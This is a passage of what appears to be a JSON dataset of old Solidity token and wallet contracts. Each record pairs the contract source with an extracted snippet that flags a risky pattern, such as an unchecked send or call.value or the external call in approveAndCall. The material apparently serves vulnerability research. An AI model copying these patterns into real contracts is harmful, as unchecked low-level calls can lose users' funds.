  "content": "pragma solidity ^0.4.11;\ncontract ERC20Interface {\n function totalSupply() constant returns (uint256);\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract RoseCoin is ERC20Interface {\n uint8 public constant decimals = 5;\n string public constant symbol = \"RSC\";\n string public constant name = \"RoseCoin\";\n uint public _level = 0;\n bool public _selling = true;\n uint public _totalSupply = 10 ** 14;\n uint public _originalBuyPrice = 10 ** 10;\n uint public _minimumBuyAmount = 10 ** 17;\n address public owner;\n mapping(address => uint256) balances;\n mapping(address => mapping (address => uint256)) allowed;\n uint public _icoSupply = _totalSupply;\n uint[4] public ratio = [12, 10, 10, 13];\n uint[4] public threshold = [95000000000000, 85000000000000, 0, 80000000000000];\n modifier onlyOwner() {\n if (msg.sender != owner) {\n revert();\n }\n _;\n }\n modifier onlyNotOwner() {\n if (msg.sender == owner) {\n revert();\n }\n _;\n }\n modifier thresholdAll() {\n if (!_selling || msg.value < _minimumBuyAmount || _icoSupply <= threshold[3]) {\n revert();\n }\n _;\n }\n function RoseCoin() {\n owner = msg.sender;\n balances[owner] = _totalSupply;\n }\n function totalSupply() constant returns (uint256) {\n return _totalSupply;\n }\n function balanceOf(address _owner) constant returns (uint256) {\n return balances[_owner];\n }\n function transfer(address _to, uint256 _amount) returns (bool) {\n if (balances[msg.sender] >= _amount\n && _amount > 0\n && balances[_to] + _amount > balances[_to]) {\n balances[msg.sender] -= _amount;\n balances[_to] += _amount;\n Transfer(msg.sender, _to, _amount);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(\n address _from,\n address _to,\n uint256 _amount\n ) returns (bool) {\n if (balances[_from] >= _amount\n && allowed[_from][msg.sender] >= _amount\n && _amount > 0\n && balances[_to] + _amount > balances[_to]) {\n balances[_from] -= _amount;\n allowed[_from][msg.sender] -= _amount;\n balances[_to] += _amount;\n Transfer(_from, _to, _amount);\n return true;\n } else {\n return false;\n }\n }\n function approve(address _spender, uint256 _amount) returns (bool) {\n allowed[msg.sender][_spender] = _amount;\n Approval(msg.sender, _spender, _amount);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256) {\n return allowed[_owner][_spender];\n }\n function toggleSale() onlyOwner {\n _selling = !_selling;\n }\n function setBuyPrice(uint newBuyPrice) onlyOwner {\n _originalBuyPrice = newBuyPrice;\n }\n function buy() payable onlyNotOwner thresholdAll returns (uint256 amount) {\n amount = 0;\n uint remain = msg.value / _originalBuyPrice;\n while (remain > 0 && _level < 3) {\n remain = remain * ratio[_level] / ratio[_level+1];\n if (_icoSupply <= remain + threshold[_level]) {\n remain = (remain + threshold[_level] - _icoSupply) * ratio[_level+1] / ratio[_level];\n amount += _icoSupply - threshold[_level];\n _icoSupply = threshold[_level];\n _level += 1;\n }\n else {\n _icoSupply -= remain;\n amount += remain;\n remain = 0;\n break;\n }\n }\n if (balances[owner] < amount)\n revert();\n if (remain > 0) {\n remain *= _originalBuyPrice;\n msg.sender.transfer(remain);\n }\n balances[owner] -= amount;\n balances[msg.sender] += amount;\n owner.transfer(msg.value - remain);\n Transfer(owner, msg.sender, amount);\n return amount;\n }\n function withdraw() onlyOwner returns (bool) {\n return owner.send(this.balance);\n }\n}\ncontract MultiSigWallet {\n event Confirmation(address sender, bytes32 transactionHash);\n event Revocation(address sender, bytes32 transactionHash);\n event Submission(bytes32 transactionHash);\n event Execution(bytes32 transactionHash);\n event Deposit(address sender, uint value);\n event OwnerAddition(address owner);\n event OwnerRemoval(address owner);\n event RequiredUpdate(uint required);\n event CoinCreation(address coin);\n mapping (bytes32 => Transaction) public transactions;\n mapping (bytes32 => mapping (address => bool)) public confirmations;\n mapping (address => bool) public isOwner;\n address[] owners;\n bytes32[] transactionList;\n uint public required;\n struct Transaction {\n address destination;\n uint value;\n bytes data;\n uint nonce;\n bool executed;\n }\n modifier onlyWallet() {\n if (msg.sender != address(this))\n revert();\n _;\n }\n modifier signaturesFromOwners(bytes32 transactionHash, uint8[] v, bytes32[] rs) {\n for (uint i=0; i<v.length; i++)\n if (!isOwner[ecrecover(transactionHash, v[i], rs[i], rs[v.length + i])])\n revert();\n _;\n }\n modifier ownerDoesNotExist(address owner) {\n if (isOwner[owner])\n revert();\n _;\n }\n modifier ownerExists(address owner) {\n if (!isOwner[owner])\n revert();\n _;\n }\n modifier confirmed(bytes32 transactionHash, address owner) {\n if (!confirmations[transactionHash][owner])\n revert();\n _;\n }\n modifier notConfirmed(bytes32 transactionHash, address owner) {\n if (confirmations[transactionHash][owner])\n revert();\n _;\n }\n modifier notExecuted(bytes32 transactionHash) {\n if (transactions[transactionHash].executed)\n revert();\n _;\n }\n modifier notNull(address destination) {\n if (destination == 0)\n revert();\n _;\n }\n modifier validRequired(uint _ownerCount, uint _required) {\n if ( _required > _ownerCount\n || _required == 0\n || _ownerCount == 0)\n revert();\n _;\n }\n function addOwner(address owner)\n external\n onlyWallet\n ownerDoesNotExist(owner)\n {\n isOwner[owner] = true;\n owners.push(owner);\n OwnerAddition(owner);\n }\n function removeOwner(address owner)\n external\n onlyWallet\n ownerExists(owner)\n {\n isOwner[owner] = false;\n for (uint i=0; i<owners.length - 1; i++)\n if (owners[i] == owner) {\n owners[i] = owners[owners.length - 1];\n break;\n }\n owners.length -= 1;\n if (required > owners.length)\n updateRequired(owners.length);\n OwnerRemoval(owner);\n }\n function updateRequired(uint _required)\n public\n onlyWallet\n validRequired(owners.length, _required)\n {\n required = _required;\n RequiredUpdate(_required);\n }\n function addTransaction(address destination, uint value, bytes data, uint nonce)\n private\n notNull(destination)\n returns (bytes32 transactionHash)\n {\n transactionHash = sha3(destination, value, data, nonce);\n if (transactions[transactionHash].destination == 0) {\n transactions[transactionHash] = Transaction({\n destination: destination,\n value: value,\n data: data,\n nonce: nonce,\n executed: false\n });\n transactionList.push(transactionHash);\n Submission(transactionHash);\n }\n }\n function submitTransaction(address destination, uint value, bytes data, uint nonce)\n external\n ownerExists(msg.sender)\n returns (bytes32 transactionHash)\n {\n transactionHash = addTransaction(destination, value, data, nonce);\n confirmTransaction(transactionHash);\n }\n function submitTransactionWithSignatures(address destination, uint value, bytes data, uint nonce, uint8[] v, bytes32[] rs)\n external\n ownerExists(msg.sender)\n returns (bytes32 transactionHash)\n {\n transactionHash = addTransaction(destination, value, data, nonce);\n confirmTransactionWithSignatures(transactionHash, v, rs);\n }\n function addConfirmation(bytes32 transactionHash, address owner)\n private\n notConfirmed(transactionHash, owner)\n {\n confirmations[transactionHash][owner] = true;\n Confirmation(owner, transactionHash);\n }\n function confirmTransaction(bytes32 transactionHash)\n public\n ownerExists(msg.sender)\n {\n addConfirmation(transactionHash, msg.sender);\n executeTransaction(transactionHash);\n }\n function confirmTransactionWithSignatures(bytes32 transactionHash, uint8[] v, bytes32[] rs)\n public\n signaturesFromOwners(transactionHash, v, rs)\n {\n for (uint i=0; i<v.length; i++)\n addConfirmation(transactionHash, ecrecover(transactionHash, v[i], rs[i], rs[i + v.length]));\n executeTransaction(transactionHash);\n }\n function executeTransaction(bytes32 transactionHash)\n public\n notExecuted(transactionHash)\n {\n if (isConfirmed(transactionHash)) {\n Transaction storage txn = transactions[transactionHash];\n txn.executed = true;\n if (!txn.destination.call.value(txn.value)(txn.data))\n revert();\n Execution(transactionHash);\n }\n }\n function revokeConfirmation(bytes32 transactionHash)\n external\n ownerExists(msg.sender)\n confirmed(transactionHash, msg.sender)\n notExecuted(transactionHash)\n {\n confirmations[transactionHash][msg.sender] = false;\n Revocation(msg.sender, transactionHash);\n }\n function MultiSigWallet(address[] _owners, uint _required)\n validRequired(_owners.length, _required)\n {\n for (uint i=0; i<_owners.length; i++)\n isOwner[_owners[i]] = true;\n owners = _owners;\n required = _required;\n }\n function()\n payable\n {\n if (msg.value > 0)\n Deposit(msg.sender, msg.value);\n }\n function isConfirmed(bytes32 transactionHash)\n public\n constant\n returns (bool)\n {\n uint count = 0;\n for (uint i=0; i<owners.length; i++)\n if (confirmations[transactionHash][owners[i]])\n count += 1;\n if (count == required)\n return true;\n }\n function confirmationCount(bytes32 transactionHash)\n external\n constant\n returns (uint count)\n {\n for (uint i=0; i<owners.length; i++)\n if (confirmations[transactionHash][owners[i]])\n count += 1;\n }\n function filterTransactions(bool isPending)\n private\n constant\n returns (bytes32[] _transactionList)\n {\n bytes32[] memory _transactionListTemp = new bytes32[](transactionList.length);\n uint count = 0;\n for (uint i=0; i<transactionList.length; i++)\n if ( isPending && !transactions[transactionList[i]].executed\n || !isPending && transactions[transactionList[i]].executed)\n {\n _transactionListTemp[count] = transactionList[i];\n count += 1;\n }\n _transactionList = new bytes32[](count);\n for (i=0; i<count; i++)\n if (_transactionListTemp[i] > 0)\n _transactionList[i] = _transactionListTemp[i];\n }\n function getPendingTransactions()\n external\n constant\n returns (bytes32[])\n {\n return filterTransactions(true);\n }\n function getExecutedTransactions()\n external\n constant\n returns (bytes32[])\n {\n return filterTransactions(false);\n }\n function createCoin()\n external\n onlyWallet\n {\n CoinCreation(new RoseCoin());\n }\n}",
  "extract_feature": [
    "function withdraw() onlyOwner returns (bool) {\nreturn owner.send(this.balance);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb160c"
  },
  "filename": "37417.sol",
  "content": "pragma solidity ^0.4.10;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\ncontract Pluton is HumanStandardToken(20000000000000000000000000, \"Pluton\", 18, \"PLU\") {}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb160d"
  },
  "filename": "37439.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract ProToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'PRO1.0';\n function ProToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb160e"
  },
  "filename": "37450.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract CandyCoinBigBang is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function CandyCoinBigBang() {\n balances[msg.sender] = 1000000000000000000000000;\n totalSupply = 1000000000000000000000000;\n name = \"Candy Coin\";\n decimals = 18;\n symbol = \"CNDY\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb160f"
  },
  "filename": "37485.sol",
  "content": "pragma solidity ^0.4.11;\ncontract ERC20Interface {\n function totalSupply() constant returns (uint256);\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract DatCoin is ERC20Interface {\n uint8 public constant decimals = 5;\n string public constant symbol = \"DTC\";\n string public constant name = \"DatCoin\";\n uint public _totalSupply = 10 ** 14;\n uint public _originalBuyPrice = 10 ** 10;\n uint public _minimumBuyAmount = 10 ** 17;\n uint public _thresholdOne = 9 * (10 ** 13);\n uint public _thresholdTwo = 85 * (10 ** 12);\n address public owner;\n mapping(address => uint256) balances;\n mapping(address => mapping (address => uint256)) allowed;\n modifier onlyOwner() {\n if (msg.sender != owner) {\n revert();\n }\n _;\n }\n modifier thresholdTwo() {\n if (msg.value < _minimumBuyAmount || balances[owner] <= _thresholdTwo) {\n revert();\n }\n _;\n }\n function DatCoin() {\n owner = msg.sender;\n balances[owner] = _totalSupply;\n }\n function totalSupply() constant returns (uint256) {\n return _totalSupply;\n }\n function balanceOf(address _owner) constant returns (uint256) {\n return balances[_owner];\n }\n function transfer(address _to, uint256 _amount) returns (bool) {\n if (balances[msg.sender] >= _amount\n && _amount > 0\n && balances[_to] + _amount > balances[_to]) {\n balances[msg.sender] -= _amount;\n balances[_to] += _amount;\n Transfer(msg.sender, _to, _amount);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(\n address _from,\n address _to,\n uint256 _amount\n ) returns (bool) {\n if (balances[_from] >= _amount\n && allowed[_from][msg.sender] >= _amount\n && _amount > 0\n && balances[_to] + _amount > balances[_to]) {\n balances[_from] -= _amount;\n allowed[_from][msg.sender] -= _amount;\n balances[_to] += _amount;\n Transfer(_from, _to, _amount);\n return true;\n } else {\n return false;\n }\n }\n function approve(address _spender, uint256 _amount) returns (bool) {\n allowed[msg.sender][_spender] = _amount;\n Approval(msg.sender, _spender, _amount);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256) {\n return allowed[_owner][_spender];\n }\n function buy() payable thresholdTwo returns (uint256 amount) {\n uint value = msg.value;\n amount = value / _originalBuyPrice;\n if (balances[owner] <= _thresholdOne + amount) {\n uint temp = 0;\n if (balances[owner] > _thresholdOne)\n temp = balances[owner] - _thresholdOne;\n amount = temp + (amount - temp) * 10 / 13;\n if (balances[owner] < amount) {\n temp = (amount - balances[owner]) * (_originalBuyPrice * 13 / 10);\n msg.sender.transfer(temp);\n amount = balances[owner];\n value -= temp;\n }\n }\n owner.transfer(value);\n balances[msg.sender] += amount;\n balances[owner] -= amount;\n Transfer(owner, msg.sender, amount);\n return amount;\n }\n function withdraw() onlyOwner returns (bool) {\n return owner.send(this.balance);\n }\n}\ncontract MultiSigWallet {\n event Confirmation(address sender, bytes32 transactionHash);\n event Revocation(address sender, bytes32 transactionHash);\n event Submission(bytes32 transactionHash);\n event Execution(bytes32 transactionHash);\n event Deposit(address sender, uint value);\n event OwnerAddition(address owner);\n event OwnerRemoval(address owner);\n event RequiredUpdate(uint required);\n event CoinCreation(address coin);\n mapping (bytes32 => Transaction) public transactions;\n mapping (bytes32 => mapping (address => bool)) public confirmations;\n mapping (address => bool) public isOwner;\n address[] owners;\n bytes32[] transactionList;\n uint public required;\n struct Transaction {\n address destination;\n uint value;\n bytes data;\n uint nonce;\n bool executed;\n }\n modifier onlyWallet() {\n if (msg.sender != address(this))\n revert();\n _;\n }\n modifier signaturesFromOwners(bytes32 transactionHash, uint8[] v, bytes32[] rs) {\n for (uint i=0; i<v.length; i++)\n if (!isOwner[ecrecover(transactionHash, v[i], rs[i], rs[v.length + i])])\n revert();\n _;\n }\n modifier ownerDoesNotExist(address owner) {\n if (isOwner[owner])\n revert();\n _;\n }\n modifier ownerExists(address owner) {\n if (!isOwner[owner])\n revert();\n _;\n }\n modifier confirmed(bytes32 transactionHash, address owner) {\n if (!confirmations[transactionHash][owner])\n revert();\n _;\n }\n modifier notConfirmed(bytes32 transactionHash, address owner) {\n if (confirmations[transactionHash][owner])\n revert();\n _;\n }\n modifier notExecuted(bytes32 transactionHash) {\n if (transactions[transactionHash].executed)\n revert();\n _;\n }\n modifier notNull(address destination) {\n if (destination == 0)\n revert();\n _;\n }\n modifier validRequired(uint _ownerCount, uint _required) {\n if ( _required > _ownerCount\n || _required == 0\n || _ownerCount == 0)\n revert();\n _;\n }\n function addOwner(address owner)\n external\n onlyWallet\n ownerDoesNotExist(owner)\n {\n isOwner[owner] = true;\n owners.push(owner);\n OwnerAddition(owner);\n }\n function removeOwner(address owner)\n external\n onlyWallet\n ownerExists(owner)\n {\n isOwner[owner] = false;\n for (uint i=0; i<owners.length - 1; i++)\n if (owners[i] == owner) {\n owners[i] = owners[owners.length - 1];\n break;\n }\n owners.length -= 1;\n if (required > owners.length)\n updateRequired(owners.length);\n OwnerRemoval(owner);\n }\n function updateRequired(uint _required)\n public\n onlyWallet\n validRequired(owners.length, _required)\n {\n required = _required;\n RequiredUpdate(_required);\n }\n function addTransaction(address destination, uint value, bytes data, uint nonce)\n private\n notNull(destination)\n returns (bytes32 transactionHash)\n {\n transactionHash = sha3(destination, value, data, nonce);\n if (transactions[transactionHash].destination == 0) {\n transactions[transactionHash] = Transaction({\n destination: destination,\n value: value,\n data: data,\n nonce: nonce,\n executed: false\n });\n transactionList.push(transactionHash);\n Submission(transactionHash);\n }\n }\n function submitTransaction(address destination, uint value, bytes data, uint nonce)\n external\n ownerExists(msg.sender)\n returns (bytes32 transactionHash)\n {\n transactionHash = addTransaction(destination, value, data, nonce);\n confirmTransaction(transactionHash);\n }\n function submitTransactionWithSignatures(address destination, uint value, bytes data, uint nonce, uint8[] v, bytes32[] rs)\n external\n ownerExists(msg.sender)\n returns (bytes32 transactionHash)\n {\n transactionHash = addTransaction(destination, value, data, nonce);\n confirmTransactionWithSignatures(transactionHash, v, rs);\n }\n function addConfirmation(bytes32 transactionHash, address owner)\n private\n notConfirmed(transactionHash, owner)\n {\n confirmations[transactionHash][owner] = true;\n Confirmation(owner, transactionHash);\n }\n function confirmTransaction(bytes32 transactionHash)\n public\n ownerExists(msg.sender)\n {\n addConfirmation(transactionHash, msg.sender);\n executeTransaction(transactionHash);\n }\n function confirmTransactionWithSignatures(bytes32 transactionHash, uint8[] v, bytes32[] rs)\n public\n signaturesFromOwners(transactionHash, v, rs)\n {\n for (uint i=0; i<v.length; i++)\n addConfirmation(transactionHash, ecrecover(transactionHash, v[i], rs[i], rs[i + v.length]));\n executeTransaction(transactionHash);\n }\n function executeTransaction(bytes32 transactionHash)\n public\n notExecuted(transactionHash)\n {\n if (isConfirmed(transactionHash)) {\n Transaction storage txn = transactions[transactionHash];\n txn.executed = true;\n if (!txn.destination.call.value(txn.value)(txn.data))\n revert();\n Execution(transactionHash);\n }\n }\n function revokeConfirmation(bytes32 transactionHash)\n external\n ownerExists(msg.sender)\n confirmed(transactionHash, msg.sender)\n notExecuted(transactionHash)\n {\n confirmations[transactionHash][msg.sender] = false;\n Revocation(msg.sender, transactionHash);\n }\n function MultiSigWallet(address[] _owners, uint _required)\n validRequired(_owners.length, _required)\n {\n for (uint i=0; i<_owners.length; i++)\n isOwner[_owners[i]] = true;\n owners = _owners;\n required = _required;\n }\n function()\n payable\n {\n if (msg.value > 0)\n Deposit(msg.sender, msg.value);\n }\n function isConfirmed(bytes32 transactionHash)\n public\n constant\n returns (bool)\n {\n uint count = 0;\n for (uint i=0; i<owners.length; i++)\n if (confirmations[transactionHash][owners[i]])\n count += 1;\n if (count == required)\n return true;\n }\n function confirmationCount(bytes32 transactionHash)\n external\n constant\n returns (uint count)\n {\n for (uint i=0; i<owners.length; i++)\n if (confirmations[transactionHash][owners[i]])\n count += 1;\n }\n function filterTransactions(bool isPending)\n private\n constant\n returns (bytes32[] _transactionList)\n {\n bytes32[] memory _transactionListTemp = new bytes32[](transactionList.length);\n uint count = 0;\n for (uint i=0; i<transactionList.length; i++)\n if ( isPending && !transactions[transactionList[i]].executed\n || !isPending && transactions[transactionList[i]].executed)\n {\n _transactionListTemp[count] = transactionList[i];\n count += 1;\n }\n _transactionList = new bytes32[](count);\n for (i=0; i<count; i++)\n if (_transactionListTemp[i] > 0)\n _transactionList[i] = _transactionListTemp[i];\n }\n function getPendingTransactions()\n external\n constant\n returns (bytes32[])\n {\n return filterTransactions(true);\n }\n function getExecutedTransactions()\n external\n constant\n returns (bytes32[])\n {\n return filterTransactions(false);\n }\n function createCoin()\n external\n onlyWallet\n {\n CoinCreation(new DatCoin());\n }\n}",
  "extract_feature": [
    "function withdraw() onlyOwner returns (bool) {\nreturn owner.send(this.balance);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1610"
  },
  "filename": "37498.sol",
  "content": "pragma solidity ^0.4.15;\ncontract generic_holder {\n address owner;\n modifier onlyowner {\n require(msg.sender == owner);\n _;\n }\n function generic_holder() {\n owner = msg.sender;\n }\n function change_owner(address new_owner) external onlyowner {\n owner = new_owner;\n }\n function execute(address _to, uint _value, bytes _data) external onlyowner payable returns (bool){\n return _to.call.value(_value)(_data);\n }\n function send(address _to) external onlyowner payable returns (bool){\n return _to.call.gas(300000).value(msg.value)();\n }\n function get_owner() constant returns (address) {\n return owner;\n }\n}",
  "extract_feature": [
    "function send(address _to) external onlyowner payable returns (bool){\nreturn _to.call.gas(300000).value(msg.value)();\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1611"
  },
  "filename": "37499.sol",
  "content": "pragma solidity ^0.4.15;\ncontract generic_holder {\n address owner;\n modifier onlyowner {\n if (owner == msg.sender)\n _;\n }\n function generic_holder() {\n owner = msg.sender;\n }\n function change_owner(address new_owner) external onlyowner {\n owner = new_owner;\n }\n function execute(address _to, uint _value, bytes _data) external onlyowner returns (bool){\n return _to.call.value(_value)(_data);\n }\n function send(address _to, uint _value) external onlyowner returns (bool){\n return _to.send(_value);\n }\n function get_owner() constant returns (address) {\n return owner;\n }\n}",
  "extract_feature": [
    "function send(address _to, uint _value) external onlyowner returns (bool){\nreturn _to.send(_value);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1612"
  },
  "filename": "37532.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Blammascoin is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Blammascoin(\n ) {\n balances[msg.sender] = 10000000000000000;\n totalSupply = 10000000000000000;\n name = 